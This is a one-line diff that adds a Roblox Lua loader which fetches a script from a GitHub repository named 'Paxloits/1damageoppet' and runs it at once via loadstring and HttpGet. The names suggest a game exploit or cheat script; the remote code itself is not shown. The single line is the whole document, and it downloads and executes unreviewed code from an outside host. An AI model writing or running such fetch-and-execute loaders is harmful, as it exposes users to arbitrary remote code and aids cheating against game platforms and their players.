@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Paxloits/1damageoppet/main/txt"))()
